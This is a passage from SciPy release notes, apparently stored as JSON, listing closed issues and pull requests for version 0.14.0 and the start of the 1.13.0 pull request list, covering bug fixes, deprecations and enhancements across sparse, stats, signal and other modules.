scipy.ndimage.gaussian_filter*() limited (Trac #1660)\n- `2186 <https://github.com/scipy/scipy/issues/2186>`__: scipy.stats.mstats.kurtosistest crashes on 1d input (Trac #1661)\n- `2238 <https://github.com/scipy/scipy/issues/2238>`__: Negative p-value on hypergeom.cdf (Trac #1719)\n- `2283 <https://github.com/scipy/scipy/issues/2283>`__: ascending order in interpolation routines (Trac #1764)\n- `2288 <https://github.com/scipy/scipy/issues/2288>`__: mstats.kurtosistest is incorrectly converting to float, and fails...\n- `2396 <https://github.com/scipy/scipy/issues/2396>`__: lpmn wrong results for ``|z| > 1`` (Trac #1877)\n- `2398 <https://github.com/scipy/scipy/issues/2398>`__: ss2tf returns num as 2D array instead of 1D (Trac #1879)\n- `2406 <https://github.com/scipy/scipy/issues/2406>`__: linkage does not take Unicode strings as method names (Trac #1887)\n- `2443 <https://github.com/scipy/scipy/issues/2443>`__: IIR filter design should not transform to tf representation internally\n- `2572 <https://github.com/scipy/scipy/issues/2572>`__: class method solve of splu return object corrupted or falsely...\n- `2667 <https://github.com/scipy/scipy/issues/2667>`__: stats endless loop ?\n- `2671 <https://github.com/scipy/scipy/issues/2671>`__: .stats.hypergeom documentation error in the note about pmf\n- `2691 <https://github.com/scipy/scipy/issues/2691>`__: BUG scipy.linalg.lapack: potrf/ptroi interpret their 'lower'...\n- `2721 <https://github.com/scipy/scipy/issues/2721>`__: Allow use of ellipsis in scipy.sparse slicing\n- `2741 <https://github.com/scipy/scipy/issues/2741>`__: stats: deprecate and remove alias for special functions\n- `2742 <https://github.com/scipy/scipy/issues/2742>`__: stats add rvs to rice distribution\n- `2765 <https://github.com/scipy/scipy/issues/2765>`__: bugs stats entropy\n- `2832 <https://github.com/scipy/scipy/issues/2832>`__: argrelextrema returns tuple of 2 empty arrays when no peaks found...\n- `2861 <https://github.com/scipy/scipy/issues/2861>`__: scipy.stats.scoreatpercentile broken for vector `per`\n- `2891 <https://github.com/scipy/scipy/issues/2891>`__: COBYLA successful termination when constraints violated\n- `2919 <https://github.com/scipy/scipy/issues/2919>`__: test failure with the current master\n- `2922 <https://github.com/scipy/scipy/issues/2922>`__: ndimage.percentile_filter ignores origin argument for multidimensional...\n- `2938 <https://github.com/scipy/scipy/issues/2938>`__: Sparse/dense matrix inplace operations fail due to __numpy_ufunc__\n- `2944 <https://github.com/scipy/scipy/issues/2944>`__: MacPorts builds yield 40Mb worth of build warnings\n- `2945 <https://github.com/scipy/scipy/issues/2945>`__: FAIL: test_random_complex (test_basic.TestDet)\n- `2947 <https://github.com/scipy/scipy/issues/2947>`__: FAIL: Test some trivial edge cases for savgol_filter()\n- `2953 <https://github.com/scipy/scipy/issues/2953>`__: Scipy Delaunay triangulation is not oriented\n- `2971 <https://github.com/scipy/scipy/issues/2971>`__: scipy.stats.mstats.winsorize documentation error\n- `2980 <https://github.com/scipy/scipy/issues/2980>`__: Problems running what seems a perfectly valid example\n- `2996 <https://github.com/scipy/scipy/issues/2996>`__: entropy for rv_discrete is incorrect?!\n- `2998 <https://github.com/scipy/scipy/issues/2998>`__: Fix numpy version comparisons\n- `3002 <https://github.com/scipy/scipy/issues/3002>`__: python setup.py install fails\n- `3014 <https://github.com/scipy/scipy/issues/3014>`__: Bug in stats.fisher_exact\n- `3030 <https://github.com/scipy/scipy/issues/3030>`__: relative entropy using scipy.stats.distribution.entropy when...\n- `3037 <https://github.com/scipy/scipy/issues/3037>`__: scipy.optimize.curve_fit leads to unexpected behavior when input...\n- `3047 <https://github.com/scipy/scipy/issues/3047>`__: mstats.ttest_rel axis=None, requires masked array\n- `3059 <https://github.com/scipy/scipy/issues/3059>`__: BUG: Slices of sparse matrices return incorrect dtype\n- `3063 <https://github.com/scipy/scipy/issues/3063>`__: range keyword in binned_statistics incorrect\n- `3067 <https://github.com/scipy/scipy/issues/3067>`__: cumtrapz not working as expected\n- `3069 <https://github.com/scipy/scipy/issues/3069>`__: sinc\n- `3086 <https://github.com/scipy/scipy/issues/3086>`__: standard error calculation inconsistent between 'stats' and 'mstats'\n- `3094 <https://github.com/scipy/scipy/issues/3094>`__: Add a `perm` function into `scipy.misc` and an enhancement of...\n- `3111 <https://github.com/scipy/scipy/issues/3111>`__: scipy.sparse.[hv]stack don't respect anymore the dtype parameter\n- `3172 <https://github.com/scipy/scipy/issues/3172>`__: optimize.curve_fit uses different nomenclature from optimize.leastsq\n- `3196 <https://github.com/scipy/scipy/issues/3196>`__: scipy.stats.mstats.gmean does not actually take dtype\n- `3212 <https://github.com/scipy/scipy/issues/3212>`__: Dot product of csr_matrix causes segmentation fault\n- `3227 <https://github.com/scipy/scipy/issues/3227>`__: ZeroDivisionError in broyden1 when initial guess is the right...\n- `3238 <https://github.com/scipy/scipy/issues/3238>`__: lbfgsb output not suppressed by disp=0\n- `3249 <https://github.com/scipy/scipy/issues/3249>`__: Sparse matrix min/max/etc don't support axis=-1\n- `3251 <https://github.com/scipy/scipy/issues/3251>`__: cdist performance issue with 'sqeuclidean' metric\n- `3279 <https://github.com/scipy/scipy/issues/3279>`__: logm fails for singular matrix\n- `3285 <https://github.com/scipy/scipy/issues/3285>`__: signal.chirp(method='hyp') disallows hyperbolic upsweep\n- `3299 <https://github.com/scipy/scipy/issues/3299>`__: MEMORY LEAK: fmin_tnc\n- `3330 <https://github.com/scipy/scipy/issues/3330>`__: test failures with the current master\n- `3345 <https://github.com/scipy/scipy/issues/3345>`__: scipy and/or numpy change is causing tests to fail in another...\n- `3363 <https://github.com/scipy/scipy/issues/3363>`__: splu does not work for non-vector inputs\n- `3385 <https://github.com/scipy/scipy/issues/3385>`__: expit does not handle large arguments well\n- `3395 <https://github.com/scipy/scipy/issues/3395>`__: specfun.f doesn't compile with MinGW\n- `3399 <https://github.com/scipy/scipy/issues/3399>`__: Error message bug in scipy.cluster.hierarchy.linkage\n- `3404 <https://github.com/scipy/scipy/issues/3404>`__: interpolate._ppoly doesn't build with MinGW\n- `3412 <https://github.com/scipy/scipy/issues/3412>`__: Test failures in signal\n- `3466 <https://github.com/scipy/scipy/issues/3466>`__: ```scipy.sparse.csgraph.shortest_path``` does not work on ```scipy.sparse.csr_matrix``` or ```lil_matrix```\n\n\nPull requests\n-------------\n\n- `442 <https://github.com/scipy/scipy/pull/442>`__: ENH: sparse: enable 64-bit index arrays & nnz > 2**31\n- `2766 <https://github.com/scipy/scipy/pull/2766>`__: DOC: remove doc/seps/technology-preview.rst\n- `2772 <https://github.com/scipy/scipy/pull/2772>`__: TST: stats: Added a regression test for stats.wilcoxon. Closes...\n- `2778 <https://github.com/scipy/scipy/pull/2778>`__: Clean up stats._support, close statistics review issues\n- `2792 <https://github.com/scipy/scipy/pull/2792>`__: BUG io: fix file descriptor closing for netcdf variables\n- `2847 <https://github.com/scipy/scipy/pull/2847>`__: Rice distribution: extend to b=0, add an explicit rvs method.\n- `2878 <https://github.com/scipy/scipy/pull/2878>`__: [stats] fix formulas for higher moments of dweibull distribution\n- `2904 <https://github.com/scipy/scipy/pull/2904>`__: ENH: moments for the zipf distribution\n- `2907 <https://github.com/scipy/scipy/pull/2907>`__: ENH: add coverage info with coveralls.io for Travis runs.\n- `2932 <https://github.com/scipy/scipy/pull/2932>`__: BUG+TST: setdiag implementation for dia_matrix (Close #2931)...\n- `2942 <https://github.com/scipy/scipy/pull/2942>`__: Misc fixes pointed out by Eclipse PyDev static code analysis\n- `2946 <https://github.com/scipy/scipy/pull/2946>`__: ENH: allow non-monotonic input in interp1d\n- `2986 <https://github.com/scipy/scipy/pull/2986>`__: BUG: runtests: chdir away from root when running tests\n- `2987 <https://github.com/scipy/scipy/pull/2987>`__: DOC: linalg: don't recommend np.linalg.norm\n- `2992 <https://github.com/scipy/scipy/pull/2992>`__: ENH: Add \"limit\" parameter to dijkstra calculation\n- `2995 <https://github.com/scipy/scipy/pull/2995>`__: ENH: Use int shape\n- `3006 <https://github.com/scipy/scipy/pull/3006>`__: DOC: stats: add a log base note to the docstring\n- `3007 <https://github.com/scipy/scipy/pull/3007>`__: DEP: stats: Deprecate randwppf and randwcdf\n- `3008 <https://github.com/scipy/scipy/pull/3008>`__: Fix mstats.kurtosistest, and test coverage for skewtest/normaltest\n- `3009 <https://github.com/scipy/scipy/pull/3009>`__: Minor reST typo\n- `3010 <https://github.com/scipy/scipy/pull/3010>`__: Add `scipy.optimize.Result` to API docs\n- `3012 <https://github.com/scipy/scipy/pull/3012>`__: Corrects documentation error\n- `3052 <https://github.com/scipy/scipy/pull/3052>`__: PEP-8 conformance improvements\n- `3064 <https://github.com/scipy/scipy/pull/3064>`__: Binned statistic\n- `3068 <https://github.com/scipy/scipy/pull/3068>`__: Fix Issue #3067 fix cumptrapz that was raising an exception when...\n- `3073 <https://github.com/scipy/scipy/pull/3073>`__: Arff reader with nominal value of 1 character\n- `3074 <https://github.com/scipy/scipy/pull/3074>`__: Some maintenance work\n- `3080 <https://github.com/scipy/scipy/pull/3080>`__: Review and clean up all Box-Cox functions\n- `3083 <https://github.com/scipy/scipy/pull/3083>`__: Bug: should return 0 if no regions found\n- `3085 <https://github.com/scipy/scipy/pull/3085>`__: BUG: Use zpk in IIR filter design to improve accuracy\n- `3101 <https://github.com/scipy/scipy/pull/3101>`__: refactor stats tests a bit\n- `3112 <https://github.com/scipy/scipy/pull/3112>`__: ENH: implement Akima interpolation in 1D\n- `3123 <https://github.com/scipy/scipy/pull/3123>`__: MAINT: an easier way to make ranges from slices\n- `3124 <https://github.com/scipy/scipy/pull/3124>`__: File object support for imread and imsave\n- `3126 <https://github.com/scipy/scipy/pull/3126>`__: pep8ify stats/distributions.py\n- `3134 <https://github.com/scipy/scipy/pull/3134>`__: MAINT: split distributions.py into three files\n- `3138 <https://github.com/scipy/scipy/pull/3138>`__: clean up tests for discrete distributions\n- `3155 <https://github.com/scipy/scipy/pull/3155>`__: special: handle the edge case lambda=0 in pdtr, pdtrc and pdtrik\n- `3156 <https://github.com/scipy/scipy/pull/3156>`__: Rename optimize.Result to OptimizeResult\n- `3166 <https://github.com/scipy/scipy/pull/3166>`__: BUG: make curve_fit() work with array_like input. Closes gh-3037.\n- `3170 <https://github.com/scipy/scipy/pull/3170>`__: Fix numpy version checks\n- `3175 <https://github.com/scipy/scipy/pull/3175>`__: use numpy sinc\n- `3177 <https://github.com/scipy/scipy/pull/3177>`__: Update numpy version warning, remove oldnumeric import\n- `3178 <https://github.com/scipy/scipy/pull/3178>`__: DEP: remove deprecated umfpack wrapper. Closes gh-3002.\n- `3179 <https://github.com/scipy/scipy/pull/3179>`__: DOC: add BPoly to the docs\n- `3180 <https://github.com/scipy/scipy/pull/3180>`__: Suppress warnings when running stats.test()\n- `3181 <https://github.com/scipy/scipy/pull/3181>`__: altered sem func in mstats to match stats\n- `3182 <https://github.com/scipy/scipy/pull/3182>`__: Make weave tests behave\n- `3183 <https://github.com/scipy/scipy/pull/3183>`__: ENH: Add k-sample Anderson-Darling test to stats module\n- `3186 <https://github.com/scipy/scipy/pull/3186>`__: Fix stats.scoreatpercentile\n- `3187 <https://github.com/scipy/scipy/pull/3187>`__: DOC: make curve_fit nomenclature same as leastsq\n- `3201 <https://github.com/scipy/scipy/pull/3201>`__: Added axis keyword to dendrogram function\n- `3207 <https://github.com/scipy/scipy/pull/3207>`__: Make docstring examples in stats.distributions docstrings runnable\n- `3218 <https://github.com/scipy/scipy/pull/3218>`__: BUG: integrate: Fix banded jacobian handling in the \"vode\" and...\n- `3222 <https://github.com/scipy/scipy/pull/3222>`__: BUG: limit input ranges in special.nctdtr\n- `3223 <https://github.com/scipy/scipy/pull/3223>`__: Fix test errors with numpy master\n- `3224 <https://github.com/scipy/scipy/pull/3224>`__: Fix int32 overflows in sparsetools\n- `3228 <https://github.com/scipy/scipy/pull/3228>`__: DOC: tf2ss zpk2ss note controller canonical form\n- `3234 <https://github.com/scipy/scipy/pull/3234>`__: Add See Also links and Example graphs to filter design ``*ord`` functions\n- `3235 <https://github.com/scipy/scipy/pull/3235>`__: Updated the buttord function to be consistent with the other...\n- `3239 <https://github.com/scipy/scipy/pull/3239>`__: correct doc for pchip interpolation\n- `3240 <https://github.com/scipy/scipy/pull/3240>`__: DOC: fix ReST errors in the BPoly docstring\n- `3241 <https://github.com/scipy/scipy/pull/3241>`__: RF: check write attr of fileobject without writing\n- `3243 <https://github.com/scipy/scipy/pull/3243>`__: a bit of maintanence work in stats\n- `3245 <https://github.com/scipy/scipy/pull/3245>`__: BUG/ENH: stats: make frozen distributions hold separate instances\n- `3247 <https://github.com/scipy/scipy/pull/3247>`__: ENH function to return nnz per row/column in some sparse matrices\n- `3248 <https://github.com/scipy/scipy/pull/3248>`__: ENH much more efficient sparse min/max with axis\n- `3252 <https://github.com/scipy/scipy/pull/3252>`__: Fast sqeuclidean\n- `3253 <https://github.com/scipy/scipy/pull/3253>`__: FIX support axis=-1 and -2 for sparse reduce methods\n- `3254 <https://github.com/scipy/scipy/pull/3254>`__: TST tests for non-canonical input to sparse matrix operations\n- `3272 <https://github.com/scipy/scipy/pull/3272>`__: BUG: sparse: fix bugs in dia_matrix.setdiag\n- `3278 <https://github.com/scipy/scipy/pull/3278>`__: Also generate a tar.xz when running paver sdist\n- `3286 <https://github.com/scipy/scipy/pull/3286>`__: DOC: update 0.14.0 release notes.\n- `3289 <https://github.com/scipy/scipy/pull/3289>`__: TST: remove insecure mktemp use in tests\n- `3292 <https://github.com/scipy/scipy/pull/3292>`__: MAINT: fix a backwards incompatible change to stats.distributions.__all__\n- `3293 <https://github.com/scipy/scipy/pull/3293>`__: ENH: signal: Allow upsweeps of frequency in the 'hyperbolic'...\n- `3302 <https://github.com/scipy/scipy/pull/3302>`__: ENH: add dtype arg to stats.mstats.gmean and stats.mstats.hmean\n- `3307 <https://github.com/scipy/scipy/pull/3307>`__: DOC: add note about different ba forms in tf2zpk\n- `3309 <https://github.com/scipy/scipy/pull/3309>`__: doc enhancements to scipy.stats.mstats.winsorize\n- `3310 <https://github.com/scipy/scipy/pull/3310>`__: DOC: clarify matrix vs array in mmio docstrings\n- `3314 <https://github.com/scipy/scipy/pull/3314>`__: BUG: fix scipy.io.mmread() of gzipped files under Python3\n- `3323 <https://github.com/scipy/scipy/pull/3323>`__: ENH: Efficient interpolation on regular grids in arbitrary dimensions\n- `3332 <https://github.com/scipy/scipy/pull/3332>`__: DOC: clean up scipy.special docs\n- `3335 <https://github.com/scipy/scipy/pull/3335>`__: ENH: improve nanmedian performance\n- `3347 <https://github.com/scipy/scipy/pull/3347>`__: BUG: fix use of np.max in stats.fisher_exact\n- `3356 <https://github.com/scipy/scipy/pull/3356>`__: ENH: sparse: speed up LIL indexing + assignment via Cython\n- `3357 <https://github.com/scipy/scipy/pull/3357>`__: Fix \"imresize does not work with size = int\"\n- `3358 <https://github.com/scipy/scipy/pull/3358>`__: MAINT: rename AkimaInterpolator to Akima1DInterpolator\n- `3366 <https://github.com/scipy/scipy/pull/3366>`__: WHT: sparse: reindent ``dsolve/*.c *.h``\n- `3367 <https://github.com/scipy/scipy/pull/3367>`__: BUG: sparse/dsolve: fix dense matrix fortran order bugs in superlu...\n- `3369 <https://github.com/scipy/scipy/pull/3369>`__: ENH minimize, minimize_scalar: Add support for user-provided...\n- `3371 <https://github.com/scipy/scipy/pull/3371>`__: scipy.stats.sigmaclip doesn't appear in the html docs.\n- `3373 <https://github.com/scipy/scipy/pull/3373>`__: BUG: sparse/dsolve: detect invalid LAPACK parameters in superlu...\n- `3375 <https://github.com/scipy/scipy/pull/3375>`__: ENH: sparse/dsolve: make the L and U factors of splu and spilu...\n- `3377 <https://github.com/scipy/scipy/pull/3377>`__: MAINT: make travis build one target against Numpy 1.5\n- `3378 <https://github.com/scipy/scipy/pull/3378>`__: MAINT: fftpack: Remove the use of ``'import *'`` in a couple test...\n- `3381 <https://github.com/scipy/scipy/pull/3381>`__: MAINT: replace np.isinf(x) & (x>0) -> np.isposinf(x) to avoid...\n- `3383 <https://github.com/scipy/scipy/pull/3383>`__: MAINT: skip float96 tests on platforms without float96\n- `3384 <https://github.com/scipy/scipy/pull/3384>`__: MAINT: add pyflakes to Travis-CI\n- `3386 <https://github.com/scipy/scipy/pull/3386>`__: BUG: stable evaluation of expit\n- `3388 <https://github.com/scipy/scipy/pull/3388>`__: BUG: SuperLU: fix missing declaration of dlamch\n- `3389 <https://github.com/scipy/scipy/pull/3389>`__: BUG: sparse: downcast 64-bit indices safely to intp when required\n- `3390 <https://github.com/scipy/scipy/pull/3390>`__: BUG: nonlinear solvers are not confused by lucky guess\n- `3391 <https://github.com/scipy/scipy/pull/3391>`__: TST: fix sparse test errors due to axis=-1,-2 usage in np.matrix.sum().\n- `3392 <https://github.com/scipy/scipy/pull/3392>`__: BUG: sparse/lil: fix up Cython bugs in fused type lookup\n- `3393 <https://github.com/scipy/scipy/pull/3393>`__: BUG: sparse/compressed: work around bug in np.unique in earlier...\n- `3394 <https://github.com/scipy/scipy/pull/3394>`__: BUG: allow ClusterNode.pre_order() for non-root nodes\n- `3400 <https://github.com/scipy/scipy/pull/3400>`__: BUG: cluster.linkage ValueError typo bug\n- `3402 <https://github.com/scipy/scipy/pull/3402>`__: BUG: special: In specfun.f, replace the use of CMPLX with DCMPLX,...\n- `3408 <https://github.com/scipy/scipy/pull/3408>`__: MAINT: sparse: Numpy 1.5 compatibility fixes\n- `3410 <https://github.com/scipy/scipy/pull/3410>`__: MAINT: interpolate: fix blas defs in _ppoly\n- `3411 <https://github.com/scipy/scipy/pull/3411>`__: MAINT: Numpy 1.5 fixes in interpolate\n- `3413 <https://github.com/scipy/scipy/pull/3413>`__: Fix more test issues with older numpy versions\n- `3414 <https://github.com/scipy/scipy/pull/3414>`__: TST: signal: loosen some error tolerances in the filter tests....\n- `3415 <https://github.com/scipy/scipy/pull/3415>`__: MAINT: tools: automated close issue + pr listings for release...\n- `3440 <https://github.com/scipy/scipy/pull/3440>`__: MAINT: wrap sparsetools manually instead via SWIG\n- `3460 <https://github.com/scipy/scipy/pull/3460>`__: TST: open image file in binary mode\n- `3467 <https://github.com/scipy/scipy/pull/3467>`__: BUG: fix validation in csgraph.shortest_path\n\n\n==========================\n", "1.13.0": "************************\n\n* `8404 <https://github.com/scipy/scipy/pull/8404>`__: ENH:special:Tighten cdflib precision to 1e-15\n* `14771 <https://github.com/scipy/scipy/pull/14771>`__: ENH: integrate.solve_ivp: allow event \\`terminal\\` attribute...\n* `16660 <https://github.com/scipy/scipy/pull/16660>`__: DOC: update pydata-sphinx theme\n* `17265 <https://github.com/scipy/scipy/pull/17265>`__: Doc: fix linalg.lstsq documentation on residues\n* `17525 <https://github.com/scipy/scipy/pull/17525>`__: TST: linalg: temporarily silence failure in test_solve_generalized_discrete_are\n* `18530 <https://github.com/scipy/scipy/pull/18530>`__: ENH: sparse: Generalize coo_array to support 1d shapes\n* `18541 <https://github.com/scipy/scipy/pull/18541>`__: MAINT: sparse: Stop supporting multi-Ellipsis indexing\n* `18828 <https://github.com/scipy/scipy/pull/18828>`__: ENH: improve dtype check in wavfile.write\n* `19444 <https://github.com/scipy/scipy/pull/19444>`__: ENH: Add faster inverse-Wishart rvs and logpdf\n* `19488 <https://github.com/scipy/scipy/pull/19488>`__: DOC: Improving \"Spectral Analysis\" section in User Guide\n* `19541 <https://github.com/scipy/scipy/pull/19541>`__: BUG: fix cosine distance result type\n* `19545 <https://github.com/scipy/scipy/pull/19545>`__: ENH: integrate._tanhsinh: support vector-valued functions\n* `19555 <https://github.com/scipy/scipy/pull/19555>`__: DOC: Small documentation and docstring corrections for \\`ShortTimeFFT\\`\n* `19560 <https://github.com/scipy/scipy/pull/19560>`__: ENH:MAINT:special:Cythonize cdflib\n* `19587 <https://github.com/scipy/scipy/pull/19587>`__: ENH:MAINT:special:Rewrite amos F77 code\n* `19631 <https://github.com/scipy/scipy/pull/19631>`__: ENH: add parameter ymax in stats.boxcox_normmax\n* `19633 <https://github.com/scipy/scipy/pull/19633>`__: ENH: use NdBSpline in RegularGridInterpolator to speed up evaluations\n* `19650 <https://github.com/scipy/scipy/pull/19650>`__: ENH: stats.kstests: add axis / nan_policy / keepdims support\n* `19662 <https://github.com/scipy/scipy/pull/19662>`__: ENH: stats.normaltest/skewtest/kurtosistest: add axis / nan_policy...\n* `19663 <https://github.com/scipy/scipy/pull/19663>`__: DOC: Add example to rv_continuous.fit\n* `19664 <https://github.com/scipy/scipy/pull/19664>`__: DOC: Add example for mstats.brunnermunzel\n* `19666 <https://github.com/scipy/scipy/pull/19666>`__: DOC: Add Example to lbfgsb docstring\n* `19667 <https://github.com/scipy/scipy/pull/19667>`__: ENH: integrate._nsum: function for finite and infinite summation\n* `19669 <https://github.com/scipy/scipy/pull/19669>`__: REL: set version to 1.13.0.dev0\n* `19672 <https://github.com/scipy/scipy/pull/19672>`__: DEP: signal: remove scipy.signal.{bspline,quadratic,cubic}\n* `19674 <https://github.com/scipy/scipy/pull/19674>`__: DEP: linalg: remove tri{,u,l}\n* `19675 <https://github.com/scipy/scipy/pull/19675>`__: DEP: signal: remove scipy.signal.{lsim2,impulse2,step2}\n* `19676 <https://github.com/scipy/scipy/pull/19676>`__: DEP: signal: remove ability to import window functions from signal...\n* `19679 <https://github.com/scipy/scipy/pull/19679>`__: MAINT: stats.theilslopes: consistent promotion of \\`x\\` and \\`y\\`\n* `19680 <https://github.com/scipy/scipy/pull/19680>`__: ENH: stats.shapiro: add axis / nan_policy / keepdims support\n* `19681 <https://github.com/scipy/scipy/pull/19681>`__: MAINT: Add binom to new C++ special lib along with its cephes...\n* `19682 <https://github.com/scipy/scipy/pull/19682>`__: TST: consolidate array API test skip decorators\n* `19687 <https://github.com/scipy/scipy/pull/19687>`__: MAINT:linalg: Remove redundant det and lu Fortran files\n* `19689 <https://github.com/scipy/scipy/pull/19689>`__: MAINT: stats.moment: rename parameter \\`moment\\` to \\`order\\`\n* `19694 <https://github.com/scipy/scipy/pull/19694>`__: MAINT: Remove \\`PDistWeightedMetricWrapper\\` and \\`CDistWeightedMetricWrapper\\`\n* `19695 <https://github.com/scipy/scipy/pull/19695>`__: MAINT: Prefer \\`np.fill_diagonal\\` over \\`diag_indices\\`\n* `19696 <https://github.com/scipy/scipy/pull/19696>`__: ENH: add \\`method\\` arg to \\`interpolate.Akima1DInterpolator\\`\n* `19698 <https://github.com/scipy/scipy/pull/19698>`__: MAINT: bump project version\n* `19701 <https://github.com/scipy/scipy/pull/19701>`__: MAINT: make import of \\`array_api_compat\\` nicer\n* `19703 <https://github.com/scipy/scipy/pull/19703>`__: DEP: non-integers in \\`factorial(..., exact=True)\\`: deprecate...\n* `19708 <https://github.com/scipy/scipy/pull/19708>`__: DOC: spatial.distance: add missing optional param markers\n* `19710 <https://github.com/scipy/scipy/pull/19710>`__: TST: fix pytest discovery errors with editable installs\n* `19711 <https://github.com/scipy/scipy/pull/19711>`__: DOC: clarify ttest_1samp argument\n* `19714 <https://github.com/scipy/scipy/pull/19714>`__: BLD: require Cython >=3.0.4, drop 0.29.X support\n* `19715 <https://github.com/scipy/scipy/pull/19715>`__: ENH: sparse: Add DOK support for 1d (without indexing)\n* `19716 <https://github.com/scipy/scipy/pull/19716>`__: ENH: enable approximation for factorialk\n* `19721 <https://github.com/scipy/scipy/pull/19721>`__: DOC: add rationale for 88 char line length\n* `19722 <https://github.com/scipy/scipy/pull/19722>`__: DOC: update release version procedure\n* `19723 <https://github.com/scipy/scipy/pull/19723>`__: ENH, MAINT: voronoi_plot_2d nicer inf lines\n* `19724 <https://github.com/scipy/scipy/pull/19724>`__: MAINT: Windows NumPy 2.x int shims\n* `19725 <https://github.com/scipy/scipy/pull/19725>`__: MNT: use int instead of long in cython code\n* `19728 <https://github.com/scipy/scipy/pull/19728>`__: MAINT: enhance the configuration for the \\`pull-request-labeler\\`...\n* `19730 <https://github.com/scipy/scipy/pull/19730>`__: MAINT: bs4 deprecation shim\n* `19731 <https://github.com/scipy/scipy/pull/19731>`__: ENH: stats.mood: add nan_policy / keepdims support\n* `19738 <https://github.com/scipy/scipy/pull/19738>`__: BLD: require \\`pythran>=0.14.0\\`\n* `19741 <https://github.com/scipy/scipy/pull/19741>`__: ENH: stats.friedmanchisquare/brunnermunzel: add axis / nan_policy...\n* `19742 <https://github.com/scipy/scipy/pull/19742>`__: CI: fix PR labeler config file\n* `19743 <https://github.com/scipy/scipy/pull/19743>`__: ENH: sparse: Add min-max 1d support and tests\n* `19744 <https://github.com/scipy/scipy/pull/19744>`__: ENH: stats.mannwhitneyu: speed improvement, memory reduction,...\n* `19745 <https://github.com/scipy/scipy/pull/19745>`__: TST: fortranfiles fix\n* `19746 <https://github.com/scipy/scipy/pull/19746>`__: CI: add labeler based on issue/PR titles\n* `19749 <https://github.com/scipy/scipy/pull/19749>`__: ENH: stats.mannwhitneyu: vectorize statistic calculation\n* `19750 <https://github.com/scipy/scipy/pull/19750>`__: DEV/BLD: generate \\`requirements/\\*\\` files to simplify build\n* `19752 <https://github.com/scipy/scipy/pull/19752>`__: DEP: deprecate complex dtypes in \\`PchipInterpolator\\` and \\`Akima1DInterpolator\\`\n* `19755 <https://github.com/scipy/scipy/pull/19755>`__: MAINT/TST: ignore backend import errors when not in array API...\n* `19757 <https://github.com/scipy/scipy/pull/19757>`__: ENH: Add vectorized scalar minimization bracket finder\n* `19758 <https://github.com/scipy/scipy/pull/19758>`__: MAINT: correct inaccurate comment\n* `19760 <https://github.com/scipy/scipy/pull/19760>`__: MAINT: interpolate: remove dead code\n* `19762 <https://github.com/scipy/scipy/pull/19762>`__: ENH: stats.monte_carlo_test: account for inexact calculation...\n* `19763 <https://github.com/scipy/scipy/pull/19763>`__: MAINT: integrate._nsum: adjust algorithm for determining number...\n* `19768 <https://github.com/scipy/scipy/pull/19768>`__: MAINT: SuperLU upstream fix for compile warnings\n* `19770 <https://github.com/scipy/scipy/pull/19770>`__: ENH: stats.wilcoxon: rewrite for speed and clarity; add PermutationMethod...\n* `19773 <https://github.com/scipy/scipy/pull/19773>`__: DOC: stats: The docstring for scipy.stats.crystalball needs an...\n* `19775 <https://github.com/scipy/scipy/pull/19775>`__: DOC: Docstring and examples for Rotation.concatenate\n* `19776 <https://github.com/scipy/scipy/pull/19776>`__: ENH: stats.rankdata: vectorize calculation\n* `19777 <https://github.com/scipy/scipy/pull/19777>`__: ENH: add \\`BSpline.insert_knot\\` method\n* `19778 <https://github.com/scipy/scipy/pull/19778>`__: DOC, MAINT: fix make dist in rel process\n* `19780 <https://github.com/scipy/scipy/pull/19780>`__: MAINT: scipy.stats: replace \\`_normtest_finish\\`/\\`_ttest_finish\\`/etc......\n* `19781 <https://github.com/scipy/scipy/pull/19781>`__: CI, MAINT: switch to stable python release\n* `19786 <https://github.com/scipy/scipy/pull/19786>`__: BLD: fix \"Failed to guess install tag\" in meson-log.txt, add...\n* `19787 <https://github.com/scipy/scipy/pull/19787>`__: DOC/BLD: macOS Homebrew OpenBlas detection advice\n* `19788 <https://github.com/scipy/scipy/pull/19788>`__: DOC: stats.trim_mean: correct documentation\n* `19790 <https://github.com/scipy/scipy/pull/19790>`__: BENCH: Added benchmarks for individual distance metrics\n* `19792 <https://github.com/scipy/scipy/pull/19792>`__: MAINT: simplify \\`t.logpdf\\`\n* `19796 <https://github.com/scipy/scipy/pull/19796>`__: API: Enable \\`pydata/sparse\\` input for csgraph module\n* `19803 <https://github.com/scipy/scipy/pull/19803>`__: TST: stats: compare geometric zscore to naive version instead...\n* `19807 <https://github.com/scipy/scipy/pull/19807>`__: DOC: fft: add note about FHT formulas\n* `19808 <https://github.com/scipy/scipy/pull/19808>`__: MAINT: move elementwise algorithms and framework\n* `19810 <https://github.com/scipy/scipy/pull/19810>`__: MAINT: set \\`NPY_NO_DEPRECATED_API\\` also for Cython code\n* `19811 <https://github.com/scipy/scipy/pull/19811>`__: BLD: set default \\`cpp_std\\` to \\`c++17\\`\n* `19818 <https://github.com/scipy/scipy/pull/19818>`__: MAINT: uarray CXX version hex cleanup\n* `19820 <https://github.com/scipy/scipy/pull/19820>`__: TST: linalg: Test Cython LAPACK complex ladiv\n* `19821 <https://github.com/scipy/scipy/pull/19821>`__: BLD: resolve missing prototype warnings in lsoda/vode\n* `19822 <https://github.com/scipy/scipy/pull/19822>`__: BLD: propack: resolve missing return value warnings\n* `19823 <https://github.com/scipy/scipy/pull/19823>`__: CI/DEV: add some new auto-labels\n* `19824 <https://github.com/scipy/scipy/pull/19824>`__: ENH:Rewrite specfun F77 code in C\n* `19825 <https://github.com/scipy/scipy/pull/19825>`__: MAINT: \\`CODEOWNERS\\` syntax fix and changes\n* `19827 <https://github.com/scipy/scipy/pull/19827>`__: MAINT: spatial: fix build warnings in \\`ckdtree\\` code\n* `19828 <https://github.com/scipy/scipy/pull/19828>`__: CI/DEV: fix and simplify \\`label-globs\\` syntax\n* `19829 <https://github.com/scipy/scipy/pull/19829>`__: MAINT: interpolate: fix build warning from \\`_ppoly.pyx\\`\n* `19837 <https://github.com/scipy/scipy/pull/19837>`__: MAINT: special: fix meson deprecation warning\n* `19838 <https://github.com/scipy/scipy/pull/19838>`__: DOC: fft: improve \\`s\\` description for real transforms\n* `19843 <https://github.com/scipy/scipy/pull/19843>`__: DOC: Add \\`fft\\` to list of submodules in tutorial\n* `19844 <https://github.com/scipy/scipy/pull/19844>`__: TST: fix more cases of fd leaks from np.load()\n* `19849 <https://github.com/scipy/scipy/pull/19849>`__: CI: fix prerelease job to use numpy 2.0, and add a second job...\n* `19853 <https://github.com/scipy/scipy/pull/19853>`__: ENH: sparse: foundation for 1D arrays (add test suite, round...\n* `19855 <https://github.com/scipy/scipy/pull/19855>`__: BLD: Revamp BLAS/LAPACK G77 ABI wrappers and fix PROPACK segfaults\n* `19856 